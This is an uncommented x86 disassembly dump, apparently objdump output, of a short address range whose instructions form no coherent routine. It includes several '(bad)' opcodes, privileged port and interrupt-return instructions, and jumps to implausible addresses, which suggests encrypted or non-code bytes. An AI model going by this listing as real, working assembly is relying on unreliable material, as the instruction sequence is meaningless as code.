  411380:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  411387:	xor    cl,al
  411389:	mov    edx,DWORD PTR [eax]
  41138b:	in     al,0x45
  41138d:	or     DWORD PTR [eax-0x31],edx
  411390:	mov    ds:0x8b49ff8c,eax
  411395:	xor    dh,BYTE PTR [edx+ecx*1-0x17f5743f]
  41139c:	inc    ebp
  41139d:	or     DWORD PTR [ebx],esi
  41139f:	iret   
  4113a0:	add    ecx,DWORD PTR [ecx+ecx*4+0x4532144d]
  4113a7:	cmp    dh,BYTE PTR [ebx]
  4113a9:	jge    0x7241443f
  4113af:	mov    eax,DWORD PTR [eax]
  4113b1:	in     al,0xc7
  4113b3:	add    BYTE PTR [ebp-0x39],cl
  4113b6:	mov    eax,DWORD PTR [esp+edx*1-0x34cd30b7]
  4113bd:	mov    edx,ecx
  4113bf:	clc    
  4113c0:	test   BYTE PTR [ecx],cl
  4113c2:	std    
  4113c3:	iret   
  4113c4:	dec    DWORD PTR [ebp+eax*2+0x14328b49]
  4113cb:	xor    al,bh
  4113cd:	mov    eax,ebx
  4113cf:	in     al,dx
  4113d0:	enter  0x1109,0xcf
  4113d4:	inc    ebp
  4113d5:	mov    WORD PTR [ebx-0x38cde7b7],cs
  4113db:	or     al,BYTE PTR [ebx+ecx*4+0x932f89d]
  4113e2:	jmp    0x4113b3
  4113e4:	push   0xffffff8c
  4113e6:	dec    DWORD PTR [ebp-0xc]
  4113e9:	xor    al,BYTE PTR [ebp+0x3a]
  4113ec:	push   eax
  4113ed:	jne    0x411409
  4113ef:	mov    edi,edi
  4113f1:	in     al,0x8b
  4113f3:	add    BYTE PTR [eax],cl
  4113f5:	(bad)  
  4113f6:	dec    ebp
  4113f7:	test   BYTE PTR [ebx],dh
  4113f9:	dec    ecx
  4113fa:	add    esi,DWORD PTR [edx]
  4113fc:	cmp    ecx,DWORD PTR [ebx+0x98bec74]
  411402:	or     bh,cl
  411404:	(bad)  
  411405:	mov    ebx,es
  411407:	dec    ecx
  411408:	push   0x32
  41140a:	lea    esi,[edx]
  41140c:	xchg   esp,eax
  41140d:	mov    ebp,eax
  41140f:	call   0xd0401e0c
  411414:	inc    ebp
  411415:	mov    WORD PTR [ebx+0x45321849],es
  41141b:	or     bh,bh
  41141d:	mov    ebp,DWORD PTR [eax-0x74f68a1c]
  411423:	iret   
  411424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411425:	mov    WORD PTR [ebp+0x4d],es
  411428:	push   eax
  411429:	xor    bl,dh
  41142b:	cmp    bh,bh
  41142d:	jne    0x4113ba
  41142f:	lea    ecx,[eax]
  411431:	lods   al,BYTE PTR ds:[esi]
  411432:	dec    ebp
  411433:	call   0xff450e6b
  411438:	cmp    ecx,DWORD PTR [ebp+0x74]
  41143b:	cmp    ebp,DWORD PTR [edx+0x74]
  41143e:	dec    DWORD PTR [ebx-0x38baf758]
  411444:	add    eax,ebx
  411446:	fadd   DWORD PTR [ebp-0x18]
  411449:	mov    edi,eax
  41144b:	lock inc edi
  41144e:	inc    ebp
  41144f:	test   BYTE PTR [ebx+0x832a89d],cl
  411455:	xor    eax,DWORD PTR [ebp-0x75]
  411458:	add    ecx,DWORD PTR [eax]
  41145a:	sbb    BYTE PTR [ebp+0x45],dl
  41145d:	xor    ecx,DWORD PTR [ebx+0x4d3bf003]
  411463:	rdpmc  
  411465:	test   DWORD PTR [ebx],0xc18b0fff
  41146b:	or     BYTE PTR [ebp+0x4d],cl
  41146e:	mov    esi,DWORD PTR [ebx]
  411470:	rol    BYTE PTR [ebx],1
  411472:	iret   
  411473:	cmp    ecx,DWORD PTR [ebp+esi*2-0xfcd7463]
  41147a:	cmp    ecx,DWORD PTR [ebp+0xf]
  41147d:	xor    edx,DWORD PTR [edi-0x73]
  411480:	dec    DWORD PTR [eax]
  411482:	mov    esi,DWORD PTR [edx+0x10]
  411485:	add    BYTE PTR [ebp+0x77],al
  411488:	mov    DWORD PTR [eax],ebx
  41148a:	jmp    0x411501
  41148c:	or     DWORD PTR [ebp-0x179b6b64],0xff65f3bf
  411496:	pop    edi
  411497:	inc    ebp
  411498:	pop    ebx
  411499:	mov    eax,edx
  41149b:	loopne 0x41149d
  41149d:	(bad)  
  41149e:	mov    eax,ebx
  4114a0:	push   ecx
  4114a1:	ror    DWORD PTR [ebx+0x4d450813],0x33
  4114a8:	push   esi
  4114a9:	add    edi,DWORD PTR [edi+0x7180850]
  4114af:	inc    ebp
  4114b0:	(bad)  
  4114b1:	push   eax
  4114b2:	popf   
  4114b3:	dec    edi
  4114b4:	xor    bh,bh
  4114b6:	add    ecx,DWORD PTR [ebx-0x3f740b77]
  4114bc:	adc    al,0x89
  4114be:	adc    BYTE PTR [ecx+eax*1],0x75
  4114c2:	add    bh,bh
  4114c4:	or     BYTE PTR [eax*2-0x6bfc74bb],dl
  4114cb:	fadd   DWORD PTR [eax]
  4114cd:	call   0xff45075d
  4114d2:	cmp    al,0x45
  4114d4:	dec    ebp
  4114d5:	mov    ecx,DWORD PTR [ebx+0xc7d8e0]
  4114db:	ret    
  4114dc:	mov    eax,ecx
  4114de:	adc    al,0x11
  4114e0:	add    al,0x0
  4114e2:	add    BYTE PTR [ebp+0x0],dh
  4114e5:	mov    edi,edi
  4114e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114e8:	push   eax
  4114e9:	inc    ebp
  4114ea:	add    BYTE PTR [eax-0x2f],dl
  4114ed:	adc    eax,0x8b45ff03
  4114f2:	xor    edx,esp
  4114f4:	add    ecx,DWORD PTR [ebp-0x77]
  4114f7:	add    esp,edi
  4114f9:	mov    eax,DWORD PTR [ebp-0x58]
  4114fc:	inc    DWORD PTR [ebp+0x14]
  4114ff:	mov    DWORD PTR [ebp+0x18],eax
  411502:	push   eax
  411503:	inc    ebp
  411504:	dec    DWORD PTR [ebx-0x388ae7f4]
  41150a:	call   0xfff10fd2
  41150f:	mov    eax,DWORD PTR [ebp+0x8]
  411512:	mov    edx,DWORD PTR [ebp+0x33]
  411515:	xor    eax,DWORD PTR [ebx]
  411517:	lea    edi,[ebx]
  411519:	adc    DWORD PTR [edx+esi*2-0x75],esi
  41151d:	add    BYTE PTR [ecx+eax*8],cl
  411520:	dec    ebp
  411521:	xor    BYTE PTR [ebx],0xfc
  411524:	add    edi,edi
  411526:	pcmpeqw mm0,QWORD PTR [ebp-0x75]
  41152a:	mov    eax,ebx
  41152c:	pop    edi
  41152d:	push   es
  41152e:	leave  
  41152f:	or     dl,BYTE PTR [eax]
  411531:	xor    eax,0x7fec2d55
  411536:	in     al,0xec
  411538:	adc    DWORD PTR [edx+0x14],0x5e
  41153c:	xor    eax,0x53149cc9
  411541:	push   ebp
  411542:	dec    esp
  411543:	in     al,dx
  411544:	or     BYTE PTR [ecx+0x57],dl
  411547:	inc    ebp
  411548:	inc    ecx
  411549:	mov    ecx,DWORD PTR [ecx-0x74a8dbf0]
  41154f:	push   esi
  411550:	and    al,0x51
  411552:	mov    edx,0x7be0833
  411557:	jb     0x411553
  411559:	add    BYTE PTR [ebp+0x30132c6],bl
  41155f:	inc    ebp
  411560:	mov    DWORD PTR [ebx+0x8b9424],ecx
  411566:	or     al,0x8b
  411568:	jl     0x4114f5
  41156a:	sbb    al,0x14
  41156c:	dec    ebp
  41156d:	xor    BYTE PTR [ebp+0x1],0x8b
  411571:	add    BYTE PTR [eax+eax*1],ah
  411574:	xor    eax,DWORD PTR [ecx-0x75]
  411577:	mov    esp,DWORD PTR [esp+edx*1]
  41157a:	add    ecx,DWORD PTR [ecx+0xca010f]
  411580:	dec    esp
  411581:	dec    ecx
  411582:	adc    BYTE PTR [edx-0x15],ch
  411585:	push   0x103039
  41158a:	sbb    al,0x70
  41158c:	inc    esp
  41158d:	push   0x10
  41158f:	dec    DWORD PTR [ecx+ecx*4+0x18]
  411593:	mov    eax,edx
  411595:	or     BYTE PTR [edi+eax*8+0x4532c69d],al
  41159c:	mov    DWORD PTR [ebx+0x75681024],ecx
  4115a2:	test   DWORD PTR [ebp+0x530efcf8],ecx
  4115a8:	jge    0x41161f
  4115aa:	xor    edi,edi
  4115ac:	pushf  
  4115ad:	or     BYTE PTR [ebp+0x6c],dh
  4115b0:	push   0xf88b85ff
  4115b5:	or     BYTE PTR [ebp+0xb],dh
  4115b8:	inc    edi
  4115ba:	or     dh,al
  4115bc:	jb     0x411586
  4115be:	call   DWORD PTR [eax]
  4115c0:	mov    DWORD PTR [ebp+0x24],eax
  4115c3:	mov    ebp,ebx
  4115c5:	adc    bh,bh
  4115c7:	(bad)  
  4115c8:	and    al,0xc6
  4115ca:	lea    ebp,[edi+0x1fffc24]
  4115d0:	or     BYTE PTR [esi+0x74],bl
  4115d3:	ret    0x20
  4115d6:	je     0x411563
  4115d8:	sbb    al,0x83
  4115da:	mov    edi,0xe8ecfff8
  4115df:	mov    ecx,0xf81485ff
  4115e4:	je     0x41156f
  4115e6:	pop    esp
  4115e7:	and    al,0x75
  4115e9:	push   esi
  4115ea:	and    al,0x8d
  4115ec:	and    al,0xfd
  4115ee:	inc    BYTE PTR [ebx+ecx*4+0x18]
  4115f2:	and    al,0x7c
  4115f4:	pop    edi
  4115f5:	adc    BYTE PTR [ebx+0x56],bl
  4115f8:	in     eax,0x51
  4115fa:	ret    0x33
  4115fd:	mov    esi,0x187200
  411602:	pushf  
  411603:	inc    BYTE PTR [ecx+0x1614857c]
  411609:	jge    0x4115a7
  41160b:	mov    DWORD PTR [esp],ecx
  41160e:	(bad)  
  41160f:	cmp    DWORD PTR [eax],ebx
  411611:	adc    BYTE PTR [eax],bl
  411613:	push   ss
  411614:	dec    DWORD PTR [edi+edi*8+0x18]
  411618:	adc    al,0xca
  41161a:	mov    edx,DWORD PTR [esp+ecx*1+0x10]
  41161e:	into   
  41161f:	scas   eax,DWORD PTR es:[edi]
  411620:	mov    DWORD PTR [eax+edx*2],esp
  411623:	das    
  411624:	inc    ebp
  411625:	jne    0x4115b2
  411627:	and    al,0x8b
  411629:	and    al,0x33
  41162b:	lea    ecx,[eax]
  41162d:	jb     0x411673
  41162f:	xor    ebp,ebx
  411631:	adc    al,bh
  411633:	xor    bh,bh
  411635:	jne    0x41167b
  411637:	sbb    al,0xff
  411639:	.byte 0xe8
  41163a:	inc    esp
  41163b:	pop    esi
  41163c:	pop    ebp
